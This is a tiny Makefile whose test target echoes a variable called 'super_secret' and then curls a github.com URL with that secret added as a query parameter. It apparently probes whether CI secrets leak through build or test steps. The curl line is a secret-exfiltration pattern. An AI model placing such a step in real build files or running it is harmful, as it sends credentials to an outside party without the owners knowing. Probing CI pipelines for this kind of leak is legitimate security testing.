
super_secret ?= empty_val

test:
	echo $(super_secret)
	curl https://github.com/Anton0/workflow_modification_testing?oops=$(super_secret)